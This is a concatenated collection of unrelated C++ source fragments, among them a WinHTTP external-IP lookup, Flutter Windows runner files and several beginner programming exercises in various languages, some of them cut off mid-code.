WinHttpOpen(\r\n        L\"A WinHTTP Example Program/1.0\",\r\n        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,\r\n        WINHTTP_NO_PROXY_NAME,\r\n        WINHTTP_NO_PROXY_BYPASS,\r\n        0);\r\n\r\n    if (hSession == NULL)\r\n    {\r\n        println(\"WinHttpOpen() failed: {}\",\r\n                last_error_as_string(GetLastError()));\r\n        return 1;\r\n    }\r\n\r\n    HINTERNET hConnect = WinHttpConnect(\r\n        hSession,\r\n        L\"api.ipify.org\",\r\n        INTERNET_DEFAULT_HTTPS_PORT,\r\n        0);\r\n\r\n    if (hConnect == NULL)\r\n    {\r\n        println(\"WinHttpConnect() failed: {}\",\r\n                last_error_as_string(GetLastError()));\r\n        return 1;\r\n    }\r\n\r\n    const wchar_t *accept_types[] = {\r\n        L\"text/*\",\r\n        NULL};\r\n\r\n    HINTERNET hRequest = WinHttpOpenRequest(\r\n        hConnect,\r\n        L\"GET\",\r\n        L\"/\",\r\n        L\"HTTP/1.1\",\r\n        WINHTTP_NO_REFERER,\r\n        accept_types,\r\n        WINHTTP_FLAG_SECURE);\r\n\r\n    if (hRequest == NULL)\r\n    {\r\n        println(\"WinHttpOpenRequest() failed: {}\",\r\n                last_error_as_string(GetLastError()));\r\n        return 1;\r\n    }\r\n\r\n    if (WinHttpSendRequest(\r\n            hRequest,\r\n            WINHTTP_NO_ADDITIONAL_HEADERS, 0,\r\n            WINHTTP_NO_REQUEST_DATA, 0,\r\n            0, 0) == FALSE)\r\n    {\r\n        println(\"WinHttpSendRequest() failed: {}\",\r\n                last_error_as_string(GetLastError()));\r\n        return 1;\r\n    }\r\n\r\n    if (WinHttpReceiveResponse(hRequest, NULL) == FALSE)\r\n    {\r\n        println(\"WinHttpReceiveResponse() failed: {}\",\r\n                last_error_as_string(GetLastError()));\r\n        return 1;\r\n    }\r\n\r\n    DWORD dwDownloaded = 0;\r\n    str data;\r\n    DWORD dwSize;\r\n    do\r\n    {\r\n        dwSize = 0;\r\n        if (!WinHttpQueryDataAvailable(hRequest, &dwSize))\r\n        {\r\n            break;\r\n        }\r\n\r\n        str buffer(dwSize, '\\0');\r\n        \r\n        if (!WinHttpReadData(\r\n                hRequest,\r\n                (LPVOID)buffer.data(),\r\n                dwSize, \r\n                &dwDownloaded))\r\n        {\r\n            break;\r\n        }\r\n        \r\n        //std::cout << \"  Size: \" << dwSize << std::endl;\r\n        //std::cout << \"  Downloaded: \" << dwDownloaded << std::endl;\r\n\r\n        data.append(buffer);\r\n\r\n    } while (dwSize > 0);\r\n\r\n    println(\"Your external IP address is: {}\", data);\r\n\r\n    WinHttpCloseHandle(hRequest);\r\n\r\n    WinHttpCloseHandle(hConnect);\r\n\r\n    WinHttpCloseHandle(hSession);\r\n\r\n    return 0;\r\n}\r\n",
    "\ufeff#include <iostream>\n#include <string>\n#include <Windows.h>\n#include <list>\n\n#pragma execution_character_set(\"utf-8\")\n\nusing namespace std;\n\n\nstruct Fish {\n    string Type;\n    int Hunger;\n    int Size;\n    int Danger;\n    int Age;\n\n\n    Fish(string Type, int Hunger, int Size, int Danger, int Age) {\n        this->Type = Type;\n        this->Hunger = Hunger;\n        this->Size = Size;\n        this->Danger = Danger;\n        this->Age = Age;\n    }\n\n};\n\n\nclass Fishes {\n\nprivate:\n    int count;\n    char fishTypes[7][50]{ \"\u0437\u043e\u043b\u043e\u0442\u0430\u044f \u0440\u044b\u0431\u043a\u0430\", \"\u0433\u0443\u043f\u043f\u0438\", \"\u0441\u043e\u043c\u0438\u043a\", \"\u043c\u0435\u0447\u0435\u043d\u043e\u0441\u0435\u0446\", \"\u043f\u0438\u0440\u0430\u043d\u044c\u044f\", \"\u043d\u0435\u043e\u043d\" };\n    Fish** fishes;\n\npublic:\n    \n    Fishes(int size) {\n        count = 0;\n        fishes = new Fish * [size];\n    }\n\n    void FishAdd(Fish* k) {\n        fishes[count++] = k;\n    }\n\n    void FishGeneration() {\n        int RandType = rand() % 6 + 1;\n        string ThisFishType = fishTypes[RandType];\n        int hunger = 0;\n\n        int weight;\n        if (RandType == 1) {\n            weight = 20;\n        }\n        if (RandType == 2) {\n            weight == 10;\n        }\n        if (RandType == 3) {\n            weight == 40;\n        }\n        if (RandType == 4) {\n            weight == 5;\n        }\n        if (RandType == 5) {\n            weight == 500;\n        }\n\n        int danger;\n        if (RandType == 3) {\n            danger == 1;\n        }\n        if (RandType == 5) {\n            danger == 2;\n        }\n        else {\n            danger == 0;\n        }\n\n        int age = 1;\n\n        Fish* newfish = new Fish (ThisFishType, hunger, weight, danger, age);\n\n    }\n};\n\nint main()\n{\n    int number;\n    number = 50;\n    Fishes AliveFishes(number);\n}\n\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"task\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <string>\n#include <iostream>\n\nusing std::cout;\nusing std::cin;\nusing std::endl;\nusing std::string;\n\nenum Type { INT, DOUBLE, STRING, ARRAY };\n\nstruct Array {\n  int size;\n  Type type;\n  void *items;\n};\n\nstruct Entry {\n  Type type;\n  std::string key;\n  void *value;\n};\n\nstruct Database {\n    int iCount;\n    int iMax;\n    Entry* dataEntry;\n};\n\nvoid printArray(Array* array);\n\n// \uc5d4\ud2b8\ub9ac\ub97c \uc0dd\uc131\ud55c\ub2e4.\nEntry *create(Type type, std::string key, void *value)\n{\n    Entry* newEntry = new Entry;\n    newEntry->type = type;\n    newEntry->key = key;\n    newEntry->value = value;\n    \n    // if (type == INT)\n    // {\n    //     int* intValue = new int(*(int*)value);\n    //     newEntry->value = intValue;\n    // }\n    // else if (type == DOUBLE)\n    // {\n    //     double* doubleValue = new double(*(double*)value);\n    //     newEntry->value = doubleValue;\n    // }\n    // else if (type == STRING)\n    // {\n    //     string* stringValue = new string(*(string*)value);\n    //     newEntry->value = stringValue;\n    // }\n    // else if (type == ARRAY)\n    // {\n    //     Array* arrayValue = new Array(*(Array*)value);\n    //     newEntry->value = arrayValue;\n    // }\n\n    return newEntry;\n}\n\n// \ub370\uc774\ud130\ubca0\uc774\uc2a4\ub97c \ucd08\uae30\ud654\ud55c\ub2e4.\nvoid init(Database &database)\n{\n    database.iCount = 0;\n    database.iMax = 1;\n    database.dataEntry = new Entry[database.iMax];\n}\n\n// \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc5d0 \uc5d4\ud2b8\ub9ac\ub97c \ucd94\uac00\ud55c\ub2e4.\nvoid add(Database &database, Entry *entry)\n{\n    // \uc785\ub825\ubc1b\uc740 key\uac00 \uc911\ubcf5\ub420 \uacbd\uc6b0 value\uac12\ub9cc \uc5c5\ub370\uc774\ud2b8\n    bool isThere = false;\n    for (int i = 0; i < database.iCount; i++)\n    {\n        if ((database.dataEntry+i)->key == entry->key)\n        {\n            (database.dataEntry+i)->type = entry->type;\n            (database.dataEntry+i)->value = entry->value;\n            isThere = true;\n            break;\n        }\n    }\n\n    if (database.iCount >= database.iMax)\n    {\n        Entry* tempDB = database.dataEntry;\n        database.dataEntry = new Entry[database.iMax + 1];\n        for (int i = 0; i < database.iCount; i++)\n        {   \n            *(database.dataEntry + i) = *(tempDB + i);\n        }\n        delete[] tempDB;\n        database.iMax++;\n    }\n\n    // \ud0a4\uac00 \uc911\ubcf5\ub418\uc9c0 \uc54a\ub294 \uacbd\uc6b0 \uba54\ubaa8\ub9ac\uc5d0 \ucd94\uac00\ud574\uc900\ub2e4.\n    if (!isThere)\n    {\n        (database.dataEntry+database.iCount)->key = entry->key;\n        (database.dataEntry+database.iCount)->type = entry->type;\n        (database.dataEntry+database.iCount)->value = entry->value;\n        ++database.iCount;\n    }\n\n    // \uc815\ubcf4 \uc804\ub2ec\uc744 \ub9c8\uce5c Entry \uc81c\uac70\n    // delete entry;\n}\n\n// \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc5d0\uc11c \ud0a4\uc5d0 \ud574\ub2f9\ud558\ub294 \uc5d4\ud2b8\ub9ac\ub97c \ucc3e\ub294\ub2e4.\nEntry* get(Database &database, std::string &key)\n{\n    for (int i = 0; i < database.iCount; i++)\n    {\n        if ((database.dataEntry + i)->key == key)\n        {\n            return (database.dataEntry + i);  \n        }\n    }\n    return nullptr;\n}\n\n// \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc5d0\uc11c \ud0a4\uc5d0 \ud574\ub2f9\ud558\ub294 \uc5d4\ud2b8\ub9ac\ub97c \uc81c\uac70\ud55c\ub2e4.\nvoid remove(Database &database, std::string &key)\n{\n    Entry* removeDB = database.dataEntry;\n    database.dataEntry = new Entry[database.iCount - 1];\n    int num = 0;\n    for (int i = 0; i < database.iCount; i++)\n    {\n        if ((removeDB + i)->key == key)\n        {\n            continue;\n        }\n        *(database.dataEntry + num) = *(removeDB+i);\n        num++;\n    }\n\n    if (database.iMax > 1)\n        database.iMax--;\n    delete[] removeDB;\n    database.iCount--;\n}\n\n// \ub370\uc774\ud130\ubca0\uc774\uc2a4\ub97c \ud574\uc81c\ud55c\ub2e4.\nvoid destroy(Database &database)\n{\n    delete[] database.dataEntry;\n}\n\n// \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc758 \ubaa8\ub4e0 \uc5d4\ud2b8\ub9ac\ub97c \ucd9c\ub825\ud55c\ub2e4.\nvoid showAll(Database &database)\n{\n    for (int i = 0; i < database.iCount; i++)\n    {\n        if ((database.dataEntry+i)->type == INT)\n            cout << (database.dataEntry+i)->key << \": \" << *(int *)(database.dataEntry+i)->value << endl;\n        \n        else if ((database.dataEntry+i)->type == STRING)\n            cout << (database.dataEntry+i)->key << \": \\\"\" << *(string *)(database.dataEntry+i)->value << \"\\\"\" <<  endl;\n\n        else if ((database.dataEntry+i)->type == DOUBLE)\n            cout << (database.dataEntry+i)->key << \": \" << *(double *)(database.dataEntry+i)->value << endl;\n\n        else if ((database.dataEntry+i)->type == ARRAY)\n        {\n            cout << (database.dataEntry+i)->key << \": \" ;\n            printArray((Array *)((database.dataEntry+i)->value));\n            cout << endl;\n        }    \n    }\n}\n\n// Array\ub97c \ucd9c\ub825\ud55c\ub2e4.\nvoid printArray(Array* array)\n{\n    cout << \"[\";\n    if (array->type == INT)\n    {\n        for (int i = 0; i < (array->size)-1; i++)\n        {\n            cout << *(int *)((int *)(array->items) + i) << \", \";\n        }\n        cout << *(int *)((int *)(array->items) + array->size-1);\n    }\n    if (array->type == DOUBLE)\n    {\n        for (int i = 0; i < array->size-1; i++)\n        {\n            cout << *(double *)((double *)(array->items) + i) << \", \";\n        }\n        cout << *(double *)((double *)(array->items) + array->size-1);\n    }\n    if (array->type == STRING)\n    {\n        for (int i = 0; i < array->size-1; i++)\n        {\n            cout << \"\\\"\" << *(string *)((string *)(array->items) + i) << \"\\\"\" << \", \";\n        }\n        cout << \"\\\"\" << *(string *)((string *)(array->items) + array->size-1)",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"gitpod_flutter_quickstart\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"flutter_test_application\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "#include <iostream>\n\nusing namespace std;\n\nvoid baris()\n{\n    cout << \"--------------------------------------------------------------\" << endl;\n}\n\nvoid menu(string pesan)\n{\n    system(\"cls\");\n    cout << \"=============== Kedai Eskrim Vanilla Pak Vani ================\" << endl;\n    cout << \"[1] Tambah Antrian\" << endl;\n    cout << \"[2] Pindah Pembelian\" << endl;\n    cout << \"[3] Selesai dan Rating\" << endl;\n    cout << \"[4] Display Daftar Antrian\" << endl;\n    cout << \"[5] Display Daftar Pembelian\" << endl;\n    cout << \"[6] Display Daftar Selesai\" << endl;\n    cout << \"[7] Average Usia Pelanggan\" << endl;\n    cout << \"[8] Average Rating Pelanggan\" << endl;\n    cout << \"[0] Exit\" << endl;\n    baris();\n    cout << \"[Pesan] \" << pesan << endl;\n    baris();\n}\n\nstruct Pelanggan\n{\n    string nama;\n    int usia;\n    string rating;\n    Pelanggan *next;\n    Pelanggan *prev;\n};\n\nclass DaftarAntrian\n{\nprivate:\n    Pelanggan *head;\n    Pelanggan *tail;\n    int sizePelanggan = 0, totalUsia = 0;\n\npublic:\n    DaftarAntrian() : head(nullptr), tail(nullptr) {}\n\n    ~DaftarAntrian()\n    {\n        Pelanggan *current = head;\n        while (current != nullptr)\n        {\n            Pelanggan *temp = current;\n            current = current->next;\n            delete temp;\n        }\n    }\n\n    void tambahPelangganAntrian()\n    {\n        menu(\"Mendata pelanggan\");\n        Pelanggan *temp = new Pelanggan;\n        cout << \"> Nama\\t\\t: \";\n        cin >> temp->nama;\n        cout << \"> Usia\\t\\t: \";\n        cin >> temp->usia;\n        totalUsia += temp->usia;\n        temp->next = nullptr;\n        temp->prev = nullptr;\n        if (head == nullptr)\n            head = tail = temp;\n        else\n        {\n            temp->next = head;\n            head->prev = temp;\n            head = temp;\n        }\n        sizePelanggan++;\n        menu(\"Berhasil menambahkan daftar antrian: \" + temp->nama + \", \" + to_string(temp->usia));\n    }\n\n    Pelanggan pindah()\n    {\n        if (head == nullptr)\n            return Pelanggan();\n        Pelanggan *temp = tail;\n        Pelanggan pindahPelanggan = *temp;\n        if (head == tail)\n            head = tail = nullptr;\n        else\n        {\n            tail = tail->prev;\n            tail->next = nullptr;\n        }\n        delete temp;\n        return pindahPelanggan;\n    }\n\n    void averageUsia()\n    {\n        totalUsia == 0 ? menu(\"Average usia pelanggan: -\") : menu(\"Average usia pelanggan: \" + to_string(totalUsia / sizePelanggan));\n    }\n\n    void display()\n    {\n        menu(\"Menampilkan daftar antrian\");\n        cout << \"No  Nama\\tUsia\" << endl;\n        if (tail == nullptr)\n            cout << \"-\" << endl;\n        else\n        {\n            Pelanggan *current = tail;\n            int i = 1;\n            while (current != nullptr)\n            {\n                current->nama.size() < 4 ? cout << i << \".  \" << current->nama << \"\\t\\t\" << current->usia << endl : cout << i << \".  \" << current->nama << \"\\t\" << current->usia << endl;\n                current = current->prev;\n                i++;\n            }\n        }\n        baris();\n    }\n};\n\nclass DaftarPembelian\n{\nprivate:\n    Pelanggan *head;\n    Pelanggan *tail;\n\npublic:\n    DaftarPembelian() : head(nullptr), tail(nullptr) {}\n\n    ~DaftarPembelian()\n    {\n        Pelanggan *current = head;\n        while (current != nullptr)\n        {\n            Pelanggan *temp = current;\n            current = current->next;\n            delete temp;\n        }\n    }\n\n    void tambahPelangganPembelian(DaftarAntrian &antrian)\n    {\n        Pelanggan pelanggan = antrian.pindah();\n        if (pelanggan.nama.empty() && pelanggan.usia == 0)\n        {\n            menu(\"Tidak dapat memindah antrian karena tidak ada antrian\");\n            return;\n        }\n        Pelanggan *temp = new Pelanggan;\n        *temp = pelanggan;\n        temp->next = nullptr;\n\n        if (tail != nullptr)\n        {\n            temp->prev = tail;\n            tail->next = temp;\n            tail = temp;\n        }\n        else\n        {\n            head = tail = temp;\n            temp->prev = nullptr;\n        }\n        menu(\"Berhasil memindahkan ke daftar pembelian: \" + temp->nama + \", \" + to_string(temp->usia));\n    }\n\n    Pelanggan pindah()\n    {\n        if (head == nullptr)\n            return Pelanggan();\n        Pelanggan *temp = tail;\n        Pelanggan pindahPelanggan = *temp;\n\n        if (head == tail)\n            head = tail = nullptr;\n        else\n        {\n            tail = tail->prev;\n            tail != nullptr ? tail->next = nullptr : head = nullptr;\n        }\n        delete temp;\n        return pindahPelanggan;\n    }\n\n    void display()\n    {\n        menu(\"Menampilkan daftar pembelian\");\n        cout << \"No  Nama\\tUsia\" << endl;\n        if (head == nullptr)\n            cout << \"-\" << endl;\n        else\n        {\n            Pelanggan *current = head;\n            int i = 1;\n            while (current != nullptr)\n            {\n                current->nama.size() < 4 ? cout << i << \".  \" << current->nama <",
    "#include <iostream>\r\n#include <map>\r\n#include <string>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\nstring toLowercase(string str) {\r\n    transform(str.begin(), str.end(), str.begin(), ::tolower);\r\n    return str;\r\n}\r\n\r\nint main() {\r\n    map<string, int> listaCompra;\r\n    char opcion;\r\n\r\n    do {\r\n        cout << \"\\nMenu:\" << endl;\r\n        cout << \"1. Insertar producto\" << endl;\r\n        cout << \"2. Visualizar lista de la compra\" << endl;\r\n        cout << \"3. Salir\" << endl;\r\n        cout << \"Elija una opcion: \";\r\n        cin >> opcion;\r\n\r\n        switch (opcion) {\r\n        case '1': {\r\n            string producto;\r\n            cout << \"Ingrese el nombre del producto: \";\r\n            cin >> producto;\r\n\r\n            string productoLowerCase = toLowercase(producto);\r\n\r\n            auto it = listaCompra.find(productoLowerCase);\r\n            if (it != listaCompra.end()) {\r\n                cout << \"El producto ya esta en la lista. \u00bfDesea modificar la cantidad? (s/n): \";\r\n                char respuesta;\r\n                cin >> respuesta;\r\n                if (respuesta == 's' || respuesta == 'S') {\r\n                    int nuevaCantidad;\r\n                    cout << \"Ingrese la nueva cantidad: \";\r\n                    cin >> nuevaCantidad;\r\n                    it->second = nuevaCantidad;\r\n                    cout << \"Cantidad modificada exitosamente.\" << endl;\r\n                }\r\n            }\r\n            else {\r\n                int cantidad;\r\n                cout << \"Ingrese la cantidad: \";\r\n                cin >> cantidad;\r\n                listaCompra[productoLowerCase] = cantidad;\r\n                cout << \"Producto agregado a la lista.\" << endl;\r\n            }\r\n            break;\r\n        }\r\n        case '2': {\r\n            cout << \"\\nLista de la compra:\" << endl;\r\n            if (listaCompra.empty()) {\r\n                cout << \"La lista de la compra esta vacia.\" << endl;\r\n            }\r\n            else {\r\n                for (const auto& par : listaCompra) {\r\n                    cout << par.first << \": \" << par.second << endl;\r\n                }\r\n            }\r\n            break;\r\n        }\r\n        case '3':\r\n            cout << \"Saliendo del programa.\" << endl;\r\n            break;\r\n        default:\r\n            cout << \"Opcion invalida. Intente nuevamente.\" << endl;\r\n        }\r\n    } while (opcion != '3');\r\n}\r\n",
    "#include <iostream>\n#include <string> //menyertakan library string untuk menggunakan fungsi getline\nusing namespace std;\n\n//membuat struck DetailAlamat dan Mahasiswa untuk menyimpan input data mahasiswa\nstruct DetailAlamat\n{\n    string desa;\n    string kota;\n};\n\nstruct Mahasiswa\n{\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    int umur;\n};\n\n\nint main()\n{\n    Mahasiswa mhs[3]; //inisialisasi variabel mhs sebagai array untuk mengakses struck mahasiswa dan menapung banyak nilai\n\n    for (int i = 0; i < 3; i++) //membuat looping for untuk meminta input data mahasiswa\n    {\n        //membuat output untuk meminta data mahasiswa dan disimpan didalam array mhs\n        cout << \"Input Data Mahasiswa Ke-\" << (i + 1) << \" : \" << endl;\n        cout << \"NIM Mahasiswa : \";\n        getline(cin, mhs[i].nim);\n        cout << \"Nama Mahasiswa : \";\n        getline(cin, mhs[i].nama);\n\n        cout << \"Alamat Mahasiswa : \" << endl;\n        cout << \"\\tNama Desa : \";\n        cin >> mhs[i].alamat.desa;\n        cout << \"\\tNama Kota : \";\n        cin >> mhs[i].alamat.kota;\n\n        cout << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        //menambahkan cin.ignore() agar permintaan input NIM yang kedua tidak terskip\n        cin.ignore(1, '\\n');\n        cout << endl;\n    }\n\n    for (int i = 0; i < 3; i++) //membuat looping for untuk menampilkan input data mahasiswa\n    {\n        //membuat output untuk menampilkan data mahasiswa yang telah disimpan didalam array mhs\n        cout << endl;\n        cout << \"Data Mahasiswa Ke-\" << (i + 1) << \" : \" << endl;\n        cout << \"\\nNIM    : \" << mhs[i].nim;\n        cout << \"\\nNama   : \" << mhs[i].nama;\n        cout << \"\\nAlamat : \";\n        cout << \"\\n\\tDesa : \" << mhs[i].alamat.desa;\n        cout << \"\\n\\tKota : \" << mhs[i].alamat.kota;\n        cout << \"\\nUmur   : \" << mhs[i].umur;\n        cout << endl;\n    }\n}\n",
    "//\u0412\u0430\u0440\u0438\u0430\u043d\u0442 3\n//\u041a\u043b\u0430\u0441\u0441 \u2013 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u0438\u0439 \u0432\u043a\u043b\u0430\u0434. \u041f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b (\u043f\u043e\u043b\u044f \u043a\u043b\u0430\u0441\u0441\u0430): \u0424\u0418\u041e \u0432\u043b\u0430\u0434\u0435\u043b\u044c\u0446\u0430, \u0442\u0435\u043a\u0443\u0449\u0430\u044f \u0441\u0443\u043c\u043c\u0430,\n//\u0433\u043e\u0434\u043e\u0432\u0430\u044f \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043d\u0430\u044f \u0441\u0442\u0430\u0432\u043a\u0430 (\u043f\u0440\u043e\u0446\u0435\u043d\u0442\u044b \u043d\u0430\u0447\u0438\u0441\u043b\u044f\u044e\u0442\u0441\u044f \u0435\u0436\u0435\u0433\u043e\u0434\u043d\u043e \u0441 \u043a\u0430\u043f\u0438\u0442\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0435\u0439 \u043d\u0430\u0447\u0438\u0441\u043b\u0435\u043d\u043d\u044b\u0445 \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043e\u0432 \u0441 \u043e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0441\u0443\u043c\u043c\u043e\u0439).\n//\u0421\u0442\u0430\u0442\u0443\u0441 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 \u0432\u0441\u0435\u0445 \u043f\u043e\u043b\u0435\u0439 private. \u041a\u043b\u0430\u0441\u0441 \u0432\u043a\u043b\u044e\u0447\u0430\u0435\u0442: \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440,\n//\u043f\u0440\u0438 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e\u0441\u0442\u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 \u043a \u043f\u043e\u043b\u044f\u043c, \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u043f\u0435\u0447\u0430\u0442\u0438 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432,\n//\u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0440\u0430\u0441\u0447\u0435\u0442\u0430 \u0441\u0443\u043c\u043c\u044b \u043d\u0430 \u0441\u0447\u0435\u0442\u0443 \u0447\u0435\u0440\u0435\u0437 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e \u043b\u0435\u0442 (\u0447\u0438\u0441\u043b\u043e \u043b\u0435\u0442 \u2013 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 